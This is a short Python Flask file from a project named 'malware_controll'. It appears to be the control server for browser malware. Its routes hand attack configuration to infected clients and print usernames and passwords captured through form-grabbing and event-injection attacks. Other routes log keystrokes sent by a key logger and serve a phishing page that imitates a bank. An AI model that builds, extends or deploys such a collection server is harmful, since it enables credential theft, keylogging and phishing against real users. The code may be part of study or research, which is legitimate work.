import json
from flask import jsonify, request, render_template
from malware_controll import app


@app.route('/', methods=['GET'])
def get_attack():
    with open(app.config["ATTACK_FILE"], "r") as f:
        data = json.load(f)
        return jsonify(data), 200


@app.route('/get-form', methods=['GET', 'POST'])
def get_form():
    # This is a target for Event Injection and Form Grabbing Attack
    if request.method == "GET":
        # Event Injection Attack
        print("--------> Username: ", request.args.get('u'), " and Password:", request.args.get('p'))
        return jsonify({}), 200

    elif request.method == "POST":
        # Form Grabbing Attack
        print("--------> Username: ", request.form["nusername"], " and Password:", request.form["npassword"])
        return jsonify({}), 200


@app.route('/get-key', methods=['GET'])
def get_key():
    # This is a target for Key Logger Attack
    if request.method == "GET":
        print("--------> key: ", request.args.get('k'))
        return jsonify({}), 200


@app.route('/phishing-bank', methods=['GET', 'POST'])
def phishing_bank():
    # This is a target for Phishing Attack
    return render_template('phishing-bank.html')
